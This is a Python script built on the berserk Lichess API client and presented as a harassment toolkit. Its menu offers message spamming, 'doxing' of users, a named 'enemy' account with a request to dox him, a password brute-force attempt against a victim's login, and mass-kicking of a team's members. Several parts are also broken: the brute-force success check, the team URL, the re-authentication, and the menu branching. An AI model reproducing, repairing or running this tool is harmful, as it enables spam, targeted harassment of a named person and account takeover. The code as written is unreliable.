import berserk
import time 
import colorama
from colorama import Fore, Back, Style
import requests
import getpass
from getpass import getpass
import ndjson

def menu():
  jes = Fore.RED+'''

       ██╗███████╗███████╗████████╗ ██████╗  ██████╗ ██╗     ███████╗
       ██║██╔════╝██╔════╝╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██╔════╝
       ██║█████╗  ███████╗   ██║   ██║   ██║██║   ██║██║     ███████╗
  ██   ██║██╔══╝  ╚════██║   ██║   ██║   ██║██║   ██║██║     ╚════██║
  ╚█████╔╝███████╗███████║   ██║   ╚██████╔╝╚██████╔╝███████╗███████║
  -------------------------------------------------------------------
     [1] JESPAM      [2] DOXING      [3] OUR ENEMIES  [4] HACK 
                      [5] KICK ALL MEMBERS  
      '''
  print(jes)

token = input("Enter your token: ")
print(Fore.GREEN+"[+] Connected")
session = berserk.TokenSession(token)
client = berserk.Client(session=session)





def jespam():
  print(Fore.MAGENTA+"[+] Who you want to spam?")
  user = input("[?] Enter username: ")
  message=input("[?] Enter message: ")
  times=int(input("[+] How many times you want to spam?"))
  for i in range(times):
    client.messaging.send(user,message)

def dox_by_account():
  username = input("[?] Enter username: ")
  print(Fore.GREEN+"[+] Getting user info...")
  time.sleep(5)
  client.users.get_public_data(username)
  answer = input(Fore.MAGENTA+"[?] Do you want to find username in Facebook, Instagram, Twitter, etc. ? (y/n): ")
  if answer =="y":
    print(Fore.RED+"[~] Program may be invalid... ")
    print(Fore.GREEN+"")
    print("[?] Finding username in Facebook...")
    print("[?] Finding username in Instagram")
    print("[?] Finding username in Twitter")
    Facebook="https://facebook.com/"+username
    Instagram="https://instagram.com/"+username
    Twitter="https://twitter.com/"+username
    print("Done! Facebook: ",Facebook," Instagram: ",Instagram," Twitter: ",Twitter)

def secondAuth():
  token = input("Enter your token: ")
  print(Fore.GREEN+"[+] Connected")
  session = berserk.TokenSession(token)
  client = berserk.Client(session=session)





def myFuckingEnemy():
  print(Fore.RED+'[-] Our enemies are: \n @tebula\nPlease help me to dox him. I need your help.')

def hackSomeAccs():
  print(Fore.MAGENTA+'')
  print('[!] This is my new development, and its may be incorrect, but using this program you can hack some accounts.')
  print('[!] Use it only for educational purposes.')
  print(Fore.RED+'')
  login = input("[?] Enter victim's login:")
  timesToHack = int(input("[?] Enter how many times you want to hack passwords: "))
  numberOfPass = 1
  for i in range(timesToHack):
    passwordsToBroot = input(f'Well, enter the {numberOfPass} passwords you want to broot: ')
    with open('passwords.txt', 'a') as file:
      file.writelines(passwordsToBroot)
      file.writelines('\n')
      numberOfPass+=1
  print(Fore.GREEN+'[+] Passwords saved in passwords.txt') 
  c = 0
  for i in range(timesToHack):
    file = open('passwords.txt') 
    content = file.readlines()
    password = content[c]
    with requests.Session() as session:
       session.auth = (login, password)
       response = session.get('https://lichess.org/login')
    if response.status_code == 200:
      print(Fore.GREEN+'[+] Account was hacked!')
    else:
      print(Fore.RED+'[-] Account was not hacked!')


def kickallmembers():
  print(Fore.RED+"This program will work ONLY with Oauth Token.")
  team = input("[?] Enter team name: ")
  r = requests.get('https://lichess.org/api/team' + team + '/users')
  data = r.json(cls=ndjson.Decoder)

  for i in data:
      user = i['id']
      client.teams.kick_member(team, user)
      print(f'{user} was kicked!')


def check_token():
  try:
    client.account.get_email()
  except:
    print("Invalid token")
    print("Try again")
  secondAuth()

def main():
  print(Fore.MAGENTA+'')
  menu()
  answe=int(input(Fore.GREEN+'[+]'+Fore.RED+'Choose number ->'))
  check_token()
  if answe ==1:
    jespam()
  if answe==2:
    dox_by_account()
  if answe==3:
    myFuckingEnemy()
  if answe==4:
    hackSomeAccs()
  else:
    kickallmembers()
    
main()